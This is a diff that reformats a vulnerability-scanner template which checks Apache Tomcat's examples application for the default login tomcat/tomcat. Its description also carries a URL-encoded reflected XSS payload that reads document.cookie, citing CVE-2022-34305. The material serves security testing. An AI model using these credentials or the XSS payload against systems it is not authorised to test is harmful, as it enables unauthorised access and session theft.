@@ -1,46 +1,44 @@
 id: tomcat-examples-login
+
 info:
+  name: Tomcat Examples Default Login
   author: 0xelkomy & C0NQR0R
-  description: Default Creds and there is XSS here, /examples/jsp/security/protected/index.jsp?dataName=%22%3E%3Cimg+src%3Dd+onerror%3Dalert%28document.cookie%29%3E&dataValue=
-    after you login you will be able to get it.
+  severity: info
+  description: Default Creds and there is XSS here, /examples/jsp/security/protected/index.jsp?dataName=%22%3E%3Cimg+src%3Dd+onerror%3Dalert%28document.cookie%29%3E&dataValue= after you login you will be able to get it.
+  reference:
+    - https://c0nqr0r.github.io/CVE-2022-34305/
   metadata:
     verified: true
-  name: Tomcat Examples Default Login
-  reference:
-  - https://c0nqr0r.github.io/CVE-2022-34305/
-  severity: info
   tags: default-login,tomcat
+
 requests:
-- attack: pitchfork
-  cookie-reuse: true
-  matchers:
-  - condition: and
-    part: body
-    type: word
-    words:
-    - You are logged in as remote user
-    - '{{username}}'
-  matchers-condition: and
-  max-redirects: 2
-  payloads:
-    password:
-    - tomcat
-    username:
-    - tomcat
-  raw:
-  - 'GET /examples/jsp/security/protected/index.jsp HTTP/1.1
+  - raw:
+      - |
+        GET /examples/jsp/security/protected/index.jsp HTTP/1.1
+        Host: {{Hostname}}
 
-    Host: {{Hostname}}
+      - |
+        POST /examples/jsp/security/protected/j_security_check HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
 
-    '
-  - 'POST /examples/jsp/security/protected/j_security_check HTTP/1.1
+        j_username={{username}}&j_password={{password}}
 
-    Host: {{Hostname}}
+    attack: pitchfork
+    payloads:
+      username:
+        - tomcat
+      password:
+        - tomcat
 
-    Content-Type: application/x-www-form-urlencoded
-
-
-    j_username={{username}}&j_password={{password}}
-
-    '
-  redirects: true
+    redirects: true
+    max-redirects: 2
+    cookie-reuse: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "You are logged in as remote user"
+          - "{{username}}"
+        condition: and
